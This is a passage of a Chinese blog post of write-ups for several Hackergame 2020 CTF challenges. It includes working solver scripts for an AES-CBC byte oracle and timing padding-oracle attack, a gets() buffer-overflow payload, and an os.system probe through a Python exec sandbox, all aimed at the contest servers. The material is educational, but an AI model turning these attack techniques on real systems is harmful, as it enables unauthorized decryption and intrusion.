+<blockquote class="wp-block-quote"><p>时间可以正向流动，也可以逆向流动，熵可以增加，也能够降低。</p><p>NETET 组织最近收到线报，地球上有一伙人找到了 shuffle 的逆函数，我们把这伙人称为 SHUFFLE 组织。技术团队分析了 SHUFFLE 组织的部分网络流量，其中的部分数据被经过了特殊处理，使其变成了人类无法阅读的顺序，但是 SHUFFLE 组织的人却似乎可以还原。</p><p>类似处理方法通常被人们称之为加密，但恐怖的是，SHUFFLE 仅仅使用了现有编程语言中自带的 shuffle 函数，如 Python 中的&nbsp;<code>random.shuffle(x)</code>，这既不需要共享知识，也没有密钥交换，数据的位置被随机打乱，并且因为其随机性，每次处理后的结果都不相同。</p><p>“等等……”，敏锐并且数理基础扎实的你打断了正在报告的同事，“shuffle 的输出是对称群 Sn 中某个置换作用在输入上的结果，这个置换可以是 Sn 中的任意元素，而且每个元素的概率相等，所以 shuffle 之后理论上就无法还原了”。</p><p>确实。这就是诡异的地方，比如&nbsp;<code>hello</code>&nbsp;可能被 shuffle 之后变成&nbsp;<code>lehol</code>，原来的信息被随机打乱了。</p><p>“等等……”，敏锐并且数理基础扎实的你再次打断了正在报告的同事，“我起码知道原来的字符串的统计特征”。</p><p>正是。我们知道 「研表究明，汉字的序顺并不定一能影阅响读」，说不定 SHUFFLE 这一伙人正是掌握了这种技术————他们能在 shuffle 空间和正常空间随意翻转穿梭。但这对于我们来说简直是不可能实现的任务，比如字符串 「<code>00001111</code>」，shuffle 之后变成了 「<code>01101001</code>」，我们又怎么可能知道 shuffle 前的数据是什么呢？幸运的是……</p><p>“等等……”，敏锐并且数理基础扎实的你，刚准备打断正在报告的同事……</p><p>好好好，你啥都懂。我们找到了一个 SHUFFLE 的密码库，但重要情报被 shuffle 化了，破译小组还没有任何进展，我们逆向得到的生成验证码的代码也放在下边了，你行你上好吧。</p><cite><a href="http://202.38.93.111:10150/" target="_blank" rel="noreferrer noopener nofollow">题目地址</a> </cite></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/shuffle.zip">shuffle.py</a><a href="https://dev.moe/wp-content/uploads/2020/11/shuffle.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-3.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-3-1024x538.png" alt="" class="wp-image-2124" width="584" height="306" srcset="https://dev.moe/wp-content/uploads/2020/11/image-3-1024x538.png 1024w, https://dev.moe/wp-content/uploads/2020/11/image-3-300x158.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-3-768x404.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-3.png 1397w" sizes="(max-width: 584px) 100vw, 584px" /></a></figure>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-4.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-4-1024x516.png" alt="" class="wp-image-2125" width="581" height="293" srcset="https://dev.moe/wp-content/uploads/2020/11/image-4-1024x516.png 1024w, https://dev.moe/wp-content/uploads/2020/11/image-4-300x151.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-4-768x387.png 768w, https://dev.moe/wp-content/uploads/2020/11/image-4.png 1438w" sizes="(max-width: 581px) 100vw, 581px" /></a><figcaption>开启 shuffle 后</figcaption></figure>
+
+
+
+<p>看到这个验证码输入方式笑喷了。试着手动输入了一波验证码，还真给了我 flag——只不过 flag 是 shuffle 过的。看来只能尝试识别 shuffle 过的验证码了。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-6.png" alt="" class="wp-image-2127" width="219" height="148" srcset="https://dev.moe/wp-content/uploads/2020/11/image-6.png 624w, https://dev.moe/wp-content/uploads/2020/11/image-6-300x203.png 300w" sizes="(max-width: 219px) 100vw, 219px" /></a></figure>
+
+
+
+<p>结合题目不断给出的提示，验证码的字符放大，可以看到不同的字符都由不同数目的、不同灰度像素点构成。假如这个数字 8 中包含了 7 个颜色为 #b7b7b7 的像素点，6 个颜色为 #b6b6b6 的像素点（以及更多），而整张图片各灰度的像素点数目均大于数字 8 对应灰度的像素点数目，则这张验证码图片就可能含有数字 8。</p>
+
+
+
+<p>按这样的思路写程序求解后，发现各种不同字符中相同灰度的像素相加在一起（以及还有干扰线的影响），不能通过简单的比较大小来判断验证码图片的字符组成。整个问题变成了线性回归问题。</p>
+
+
+
+<p>又到了我很菜的算法环节了。好在有很多现成的库可以直接调用，只要将各像素点数目化为矩阵传入库求解即可。</p>
+
+
+
+<p>一开始发现求出的字符数矩阵非常离谱，各种负数、小数。又好在 Hackergame 2019 有一道<a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/2077_%E6%B5%B7%E5%BA%95%E6%8D%9E%E9%92%88/README.md" target="_blank" rel="noreferrer noopener">类似的题目</a>，换成了推荐的 Lasso 算法后多次请求验证码即可成功求解。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import numpy as np
+from PIL import ImageFont, ImageDraw, Image
+import pathlib
+import sys
+import requests
+from io import BytesIO
+from sklearn import linear_model
+# https://download.lfd.uci.edu/pythonlibs
+
+import string
+from random import SystemRandom
+random = SystemRandom()
+
+alphabets = sorted(string.digits + string.ascii_letters)
+
+def img_generate(text):
+    img = Image.new('RGB', (40 * len(text), 100), (255, 255, 255))
+    # https://github.com/adobe-fonts/source-code-pro/raw/release/TTF/SourceCodePro-Light.ttf
+    fontpath = pathlib.Path(__file__).parent.absolute().joinpath("SourceCodePro-Light.ttf")
+    font = ImageFont.truetype(str(fontpath), 64)
+    draw = ImageDraw.Draw(img)
+    draw.text((0, 0), text, font = font, fill = (0,0,0,0))
+    return img
+
+def get_pixel_stat(img):
+    pix = np.array(img)
+    x, y, z = pix.shape
+    t = pix.reshape(-1, z).tolist()
+    rgb = [0] * 255
+    for pixel in t:
+        if pixel[0] == pixel[1] and pixel[1] == pixel[2] and pixel[0] != 255:
+            rgb[pixel[0]] += 1   
+    return rgb
+
+if __name__ == "__main__":
+    alphastatdb = [[] for i in range(len(alphabets))]
+    for idx, alphabet in enumerate(alphabets):
+        alphastatdb[idx] = get_pixel_stat(img_generate(alphabet))
+
+    s = requests.Session()
+    s.get('http://202.38.93.111:10150/?token=【选手token】')
+    
+    while True:
+        s.get('http://202.38.93.111:10150/shuffle')
+        response = s.get('http://202.38.93.111:10150/captcha_shuffled.bmp')
+        i = Image.open(BytesIO(response.content))
+        # i.save('captcha_web.bmp')
+
+        imgstat = get_pixel_stat(i)
+
+        X = np.array(alphastatdb)
+        y = np.array([imgstat])
+
+        regr = linear_model.Lasso(alpha=1, positive=True)
+        regr.fit(X.T, y.T)
+        print(regr.coef_)
+
+        result = regr.coef_
+        score = {}
+        for idx, n in enumerate(result):
+            score[alphabets[idx]] = n
+        score = {k: v for k, v in sorted(score.items(), key=lambda item: item[1], reverse=True)}
+        
+        submit = []
+        i = 0
+        for a in score:
+            rscore = round(score[a])
+            if rscore > 0:
+                submit.append('r_' + a + '=' + str(rscore))
+                i += rscore
+            if i >= 16:
+                break
+        submit = '&amp;'.join(submit)
+        print(submit)
+        response = s.get('http://202.38.93.111:10150/result?' + submit)
+        response = response.content.decode('utf-8')
+        if '{' in response:
+            print(response)
+            break
+</pre>
+
+
+
+<h2>中间人 750</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>为了避开 Eve 同学的干扰，某一天 Alice 悄悄找到了你，想让你帮忙传送一些加密消息给 Bob。当然，出于一些安全方面的考虑，Alice 想了几种方法在消息里加入了一些校验。</p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/MITM.zip">MITM.zip</a><a href="https://dev.moe/wp-content/uploads/2020/11/MITM.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>一道 AES-CBC(plain + hash + padding) 的题目，第一小问的 hash 使用了 sha-256，后两小问使用了自定义参数的 hmac-crc-128。本题中使用了 PKCS#7 padding ，并进行了严格的校验。一旦校验不通过，则 Bob 直接回复 “What&#8217;s your problem???”。</p>
+
+
+
+<p>第一问让我想到了 0CTF 2017 的 integrity 一题（<a href="https://dev.moe/484" target="_blank" rel="noreferrer noopener">write up</a>）。在本题中从 flag 末尾起逐字猜测 flag，并自行加上正确的 aes256 hash 及 padding，通过 Bob 的反馈来判断猜测是否正确，最终获得完整 flag。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
+import time
+from hashlib import sha256
+from itertools import chain
+
+printable = [10] + list(reversed(range(32, 128)))
+
+def xor(b1, b2):
+    return bytes([x ^ y for x, y in zip(b1, b2)])
+
+HOST = '202.38.93.111'
+PORT = 10041
+p = remote(HOST, PORT)
+print(p.recvuntil('Please input your token:'))
+p.sendline('【选手token】')
+
+# p = process(['python', 'entry.py'])
+
+print(p.recvuntil('Which level do you want to play (1/2/3)?'))
+p.sendline('1')
+
+flag_len = 45
+flag = ''
+
+while len(flag) &lt; flag_len:
+    pos = len(flag) + 1
+    msg = "Thanks " + " for taking my flag: "
+    name = b"\xAA" * (16 - ((len(msg) + flag_len) % 16) + pos)
+    prefix_len = len(msg) + len(name)
+    for guess in printable:
+        extra = sha256((chr(guess) + flag).encode()).digest()
+        pad = 16 - ((prefix_len + flag_len) % 16) 
+        extra += bytes([pad]) * pad
+
+        p.recvuntil('Whom do you want to talk to?')
+        p.sendline('Alice')
+        p.sendline(name.hex())
+        p.sendline(extra.hex())
+        p.recvuntil('This is my encrypted message, please take it to Bob:\n')
+        enc = bytes.fromhex(p.recvuntil('\n', drop=True).decode())
+        
+        start = 16 + prefix_len + flag_len - pos - 16
+        end = start + 16 + pos + len(extra)
+        assert start % 16 == 0
+        assert end % 16 == 0
+        enc = enc[start: end]
+        p.recvuntil('Whom do you want to talk to?')
+        p.sendline('Bob')
+        p.recvuntil('Show me your message from Alice:')
+        p.sendline(enc.hex())
+        result = p.recvuntil('\n', drop=True).decode()
+        print(chr(guess), result)
+        if 'Thanks' in result:
+            break
+        elif 'problem' in result:
+            continue
+        else:
+            raise Exception("server returns: " + result)
+    flag = chr(guess) + flag
+    print(flag)
+</pre>
+
+
+
+<p>第二、三小问则换用了随机密钥的 hmac-crc-128 作为校验码，似乎是一道数学题。只发现 <code>hmac-crc(a ^ b ^ c) = hmac-crc(a) ^ hmac-crc(b) ^ hmac-crc(c)</code> 这一规律，但似乎无法直接使用。第三问还限制中间人不能修改 IV，感觉更无头绪。</p>
+
+
+
+<p>不过之前提到本题中 padding 进行了严格校验。一旦校验失败，Bob 将直接返回错误信息。另外本题中的 hmac-crc 算法是在 python 中实现的，因此效率不是非常高，可以基于解密流程的耗时进行攻击。应该是非预期解法了，不过看到好多选手都是 2、3 问同时提交的，总感觉其他选手可能也在使用这个方法（。</p>
+
+
+
+<p>将要猜测的字节放到 padding 最后一位，并通过上一段密文进行控制。如果猜测正确，则 padding 为 0x01，进入后续的 hmac-crc 算法后返回异常（耗时较长）；如果猜测错误，则 padding 校验环节直接返回异常（耗时较短）。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
+import time
+import numpy as np
+
+printable = range(32, 128)
+
+def xor(b1, b2):
+    return bytes([x ^ y for x, y in zip(b1, b2)])
+
+
+def crack(p, pos):
+    print(p.recvuntil('Whom do you want to talk to?'))
+    p.sendline('Alice')
+    msg = "Thanks " + " for taking my flag: "
+    # 延长服务端计算 CRC-128 时间
+    name = b'\xAA' * (16 - len(msg) % 16) + b'\xAA' * (16 * 1024 - pos)
+    # pos = 1 -> 确保flag第1字节在块末尾(len(msg) % 16 = 15)
+    extra = b'\xAA' * (16 * 2048 - len(name))
+    p.sendline(name.hex())
+    p.sendline(extra.hex())
+    print(p.recvuntil('This is my encrypted message, please take it to Bob:\n'))
+    enc = bytes.fromhex(p.recvuntil('\n', drop=True).decode())
+
+    prefix_len = len(msg) + len(name)
+    assert (prefix_len + pos) % 16 == 0
+    extra_iv = enc[prefix_len + pos - 16: prefix_len + pos]
+    extra_block = enc[prefix_len + pos: prefix_len + pos + 16]
+
+
+    timedb = { }
+    for i in range(10):
+        print('round', i)
+        for guess in printable:
+            if guess not in timedb:
+                timedb[guess] = []
+            new_extra_iv = extra_iv[:-1] + bytes([extra_iv[15] ^ guess ^ 0x1])
+            p.recvuntil('Whom do you want to talk to?')
+            p.sendline('Bob')
+            p.recvuntil('Show me your message from Alice:')
+            p.send(enc.hex() + new_extra_iv.hex() + extra_block.hex())
+            start_time = time.time()
+            p.send('\n')
+            p.recvuntil('\n', drop=True)
+            t = time.time() - start_time
+            timedb[guess].append(t)
+            # print("--- %s seconds ---" % (t))
+
+    max_chr = ''
+    max_time = 0
+    for guess in timedb:
+        mid = min(timedb[guess])
+        if mid > max_time:
+            max_chr = chr(guess)
+            max_time = mid
+            print(max_chr, max_time)
+    return max_chr
+
+HOST = '202.38.93.111'
+PORT = 10041
+p = remote(HOST, PORT)
+print(p.recvuntil('Please input your token:'))
+p.sendline('【选手token】')
+
+print(p.recvuntil('Which level do you want to play (1/2/3)?'))
+p.sendline('2') // or 3
+
+ret = ''
+for pos in range(len(ret) + 1, 70):
+    ret = ret + crack(p, pos)
+    print(ret)
+
+</pre>
+
+
+
+<h2>从零开始的火星文生活 150</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>一年一度的 Hackergame 就要到了，L 同学打算叫上 Q 同学一起去参加，却一连几天都见不到 Q 同学的人影。然而在比赛开始的前一天晚上却收到了来自 Q 同学的邮件：</p><p>Subject: 绝密！不要外传！！！<br>Body: 详情见附件<br>From: Q<br><br>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？<br>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/gibberish_message.txt">gibberish_message.txt</a><a href="https://dev.moe/wp-content/uploads/2020/11/gibberish_message.txt" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>二进制方式打开文件，显然是 UTF-8 编码的一串文字。然而尝试了几个简单的编码转换后依然像 L 同学一样一脸懵逼。</p>
+
+
+
+<p>试试将这些乱码丢入搜索引擎吧！简单搜索后，发现网上确实有一些类似的乱码。此时可以基本断定这是实际生活中会出现的错误转码。</p>
+
+
+
+<p>最后视线转回题干，发现 “GBK 编码” 几个字被加粗了，开始重点使用 GBK 相关编码转换尝试。最终经过各种折腾及编码特征搜索，发现进行 UTF-8 解码 -&gt; GBK 编码 -&gt; UTF-8  解码 -&gt; (ISO-8859-1 Latin-1 编码) -&gt; GBK 解码 可成功获得原文。</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2.png"><img loading="lazy" width="1024" height="503" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-1024x503.png" alt="" class="wp-image-2112" srcset="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-1024x503.png 1024w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-300x147.png 300w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-768x377.png 768w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-1536x754.png 1536w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2-1568x770.png 1568w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-4.2.png 1766w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>
+
+
+
+<h2>超简单的世界模拟器 250</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>你知道生命游戏（Conway&#8217;s Game of Life）吗？<br>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。<br>通过改变左上角 15&#215;15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：<br>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。<br>注: 你的输入是 15 行文本，每行由 15 个 0 或者 1 组成，代表该区域的内容。</p></blockquote>
+
+
+
+<p>没想到会在 CTF 玩到 <a href="https://zh.wikipedia.org/zh-cn/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F" target="_blank" rel="noreferrer noopener">Game of Life</a>&#8230; </p>
+
+
+
+<p>查阅百科可以了解 Game of Life 的运作规则，并获得一些常见的图样。要消除右上角的细胞，选取一个会不断向右移动的图样即可。这里选取了 Spaceship 图样，拿到第一个 Flag。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/2.2.gif"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/2.2.gif" alt="" class="wp-image-2108" width="469" height="536"/></a></figure>
+
+
+
+<p>但要消除右下方的块，似乎有些困难。尝试放置了一个会往右下方移动的图样，然而即使放在最合适的位置，依然无法接触到右下方的细胞。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-2.2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-2.2.png" alt="" class="wp-image-2110" width="570" height="464"/></a></figure>
+
+
+
+<p>艺术就是爆炸！于是在网上搜寻有没有能够大量繁殖的图样，最终找来了一个称作 <a href="http://www.scholarpedia.org/article/Game_of_Life#Patterns" target="_blank" rel="noreferrer noopener">R-Pentomino</a> 的图样。将其多次翻转及移动位置后，结合 Spaceship 成功消除了两处细胞。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/2.3.gif"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/2.3.gif" alt="" class="wp-image-2107" width="460" height="526"/></a></figure>
+
+
+
+<h2>自复读的复读机 300</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>能够复读其他程序输出的程序只是普通的复读机。<br>顶尖的复读机还应该能复读出自己的源代码。<br>什么是国际复读机啊（战术后仰）<br>你现在需要编写两个只有一行 Python 代码的顶尖复读机：<br>&gt; 其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）<br>&gt; 另一个是输出代码本身的 sha256 哈希值，十六进制小写<br>满足两个条件分别对应了两个 flag。<br>快来开始你的复读吧~</p></blockquote>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image.png" alt="" class="wp-image-2115" width="445" height="265" srcset="https://dev.moe/wp-content/uploads/2020/11/image.png 822w, https://dev.moe/wp-content/uploads/2020/11/image-300x179.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-768x459.png 768w" sizes="(max-width: 445px) 100vw, 445px" /></a></figure>
+
+
+
+<p>初看似乎又是一道很烧脑的题目&#8230; 不过注意到第二问——要让代码能够输出自身的 sha256 值——在代码无法读取到自身的情况下，这似乎是不可能完成的任务。因此，先将目光聚焦到如何能够让代码读取到自身。</p>
+
+
+
+<p>注意到题目中用的是 python 的 <code>exec</code> 命令，而不是 <code>eval</code>。<code>eval</code> 只能拿来执行表达式，而 <code>exec</code> 则可以用来执行代码。先看看是否有权执行系统命令吧。</p>
+
+
+
+<p>提交 <code>import os; os.system('ls')</code>，成功列出目录，并找到了题目文件 <code>checker.py</code>：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import subprocess
+import hashlib
+
+if __name__ == "__main__":
+    code = input("Your one line python code to exec(): ")
+    print()
+    if not code:
+        print("Code must not be empty")
+        exit(-1)
+    p = subprocess.run(
+        ["su", "nobody", "-s", "/bin/bash", "-c", "/usr/local/bin/python3 /runner.py"],
+        input=code.encode(),
+        stdout=subprocess.PIPE,
+    )
+    
+    if p.returncode != 0:
+        print()
+        print("Your code did not run successfully")
+        exit(-1)
+        
+    output = p.stdout.decode()
+    
+    print("Your code is:")
+    print(repr(code))
+    print()
+    print("Output of your code is:")
+    print(repr(output))
+    print()
+    
+    print("Checking reversed(code) == output")
+    if code[::-1] == output:
+        print(open("/root/flag1").read())
+    else:
+        print("Failed!")
+    print()
+    
+    print("Checking sha256(code) == output")
+    if hashlib.sha256(code.encode()).hexdigest() == output:
+        print(open("/root/flag2").read())
+    else:
+        print("Failed!")
+      </pre>
+
+
+
+<p>一眼望去，似乎直接读取 <code>runner.py</code> 就能获得用户提交的代码了？可惜 <code>runner.py</code> 只包含了一句：<code>exec(input())</code>，而用户输入的代码是通过 <code>subprocess.run</code> 的 input 参数中传入的，无法简单获取。</p>
+
+
+
+<p>不过，虽然我们无法直接获取自身的代码，但我们可以将要执行的代码赋值给一个变量 <code>code</code>，然后自己调用 <code>exec</code>。调用时，我们将 <code>code</code> 作为变量主动传入。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">code="[内部代码]";exec(code,{},{'code':code})</pre>
+
+
+
+<p>接着在内部利用传入的变量 <code>code</code> ，构建出完整的代码，赋值给 <code>mycode</code>。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">code="mycode='code='+chr(34)+code.replace('\\\\','\\\\\\\\')+chr(34)+';exec(code,{},{\\'code\\':code})';print([为所欲为])";exec(code,{},{'code':code})</pre>
+
+
+
+<p>此时 <code>mycode</code> 变量就是我们输入的代码自身了。现在，无论是要对自身代码倒序输出还是计算 sha256，都可以为所欲为了~</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1-1024x549.png" alt="" class="wp-image-2116" width="541" height="290" srcset="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1-1024x549.png 1024w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1-300x161.png 300w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1-768x412.png 768w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-5.1.png 1167w" sizes="(max-width: 541px) 100vw, 541px" /></a></figure>
+
+
+
+<h2>生活在博弈树上 350</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>现代人工智能以埃米尔·博雷尔的“让一只猴子在打字机上随机地按键，当按键时间达到无穷时，几乎必然能够打出任何给定的文字，比如莎士比亚的全套著作。”为嚆矢。滥觞于哲学与数学的期望正失去它们的借鉴意义。但面对看似无垠的未来天空，我想循约翰·冯·诺伊曼“年轻人，在数学中你不理解事情，你只是习惯它们。”好过过早地振翮。<br>&#8230;（省略若干行）<br>用在博弈树上的生活方式体现个体的超越性，保持婞直却又不拘泥于所谓“遗世独立”的单向度形象。这便是恩里科·费米为我们提供的理想期望范式。生活在博弈树上——始终热爱大地——升上天空。</p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/tictactoe.zip">tictactoe.zip</a><a href="https://dev.moe/wp-content/uploads/2020/11/tictactoe.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>一开始没看懂题目在说啥，后来发现好像是魔改的某篇知名高考作文，出题人有心了 =-=！</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/image-8.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/image-8.png" alt="" class="wp-image-2147" width="575" height="416" srcset="https://dev.moe/wp-content/uploads/2020/11/image-8.png 816w, https://dev.moe/wp-content/uploads/2020/11/image-8-300x218.png 300w, https://dev.moe/wp-content/uploads/2020/11/image-8-768x557.png 768w" sizes="(max-width: 575px) 100vw, 575px" /></a><figcaption>是井字棋游戏</figcaption></figure>
+
+
+
+<p>这是一款井字棋游戏，电脑使用博弈树选出下一步走法，不过本题解法与博弈树似乎并无关系。</p>
+
+
+
+<p>分析源码，可以看到标记是否胜利的 success 变量似乎可以被 gets 覆盖。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">    bool success = false;  // human wins?
+    char input[128] = {};  // input is large and it will be ok.
+...
+    gets(input);</pre>
+
+
+
+<p>直接在网页终端用调用 api 丢几百字节的 0x01（true）过去即可获得第一小问的 flag。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">socket.send("(1,1)" + "\x01".repeat(160) + "\n")</pre>
+
+
+
+<p>第二小问很明显是 pwnable 类型的了，简单查了下似乎程序开启了多种保护，果断放弃。</p>
+
+
+
+<p>后来看到<a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E7%94%9F%E6%B4%BB%E5%9C%A8%E5%8D%9A%E5%BC%88%E6%A0%91%E4%B8%8A/README.md" target="_blank" rel="noreferrer noopener">本题的官方题解</a>是用了 ROP 来解。嗯，我应该确实是做不出的 （= =||）。</p>
+
+
+
+<h2>来自未来的信笺 200</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。<br>&#8220;Send from Arctic.&#8221; 正文就只有这一句话。<br>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。<br>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://dev.moe/wp-content/uploads/2020/11/frames.zip">frames.zip</a><a href="https://dev.moe/wp-content/uploads/2020/11/frames.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>找了半天，竟然没找到一个靠谱的可以扫描二进制二维码的命令行工具。</p>
+
+
+
+<p>于是写个 node.js 脚本吧：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import fs from 'node:fs/promises';
+import jsQR from "jsqr";
+import decode from 'image-decode'
+
+let files = await fs.readdir('.')
+let output = [];
+for (let file of files) {
+    console.log(file)
+    if (!file.endsWith('.png')) {
+        continue
+    }
+
+    let image = await fs.readFile(file)
+    let image_info = decode(image)
+    let code = jsQR(image_info.data, image_info.width, image_info.height, { inversionAttempts: 'dontInvert' })
+    output = output.concat(code.binaryData)
+}
+
+fs.writeFile('output.bin', new Uint8Array(output))</pre>
+
+
+
+<p>获得一个类似压缩包的文件，使用 7z 打开解压即可。</p>
+
+
+
+<h2>签到 50</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>谢邀，利益相关：老签到出题人了。<br>今年出题组的要求是「来参加我们比赛的同学很多都是初学者，我们的签到题要清晰明确一点，让同学们轻松签到。」<br>我完全明白了，签到题就是送 flag，送就送，我最会送了.jpg<br>首先写好题目介绍：「你需要点击下面蓝色的 “打开/下载题目” 按钮，在打开的网页上获取到形如 flag{…} 的 flag，回到本页面，将其完整填写到下面的文本框中，并点击灰色的 “提交” 按钮即可完成本题。」<br>然后写一个 flag 提取器，选手要多少个 flag，我就给多少个 flag，绿色背景，红色加粗，显眼的位置，标准的格式，这都不叫送，那还有什么叫做送。<br>点击 「打开/下载题目」 按钮，打开 flag 提取器，获取第一个 flag 吧！<br>提示：完成题目遇到困难？你可以参考 2018 年签到题题解 与 2019 年签到题题解。</p><cite><a href="https://gist.github.com/Coxxs/e1875fc8d9202040b2ea6ba4355b63a3" target="_blank" rel="noreferrer noopener nofollow">题目页面（源码）</a></cite></blockquote>
+
+
+
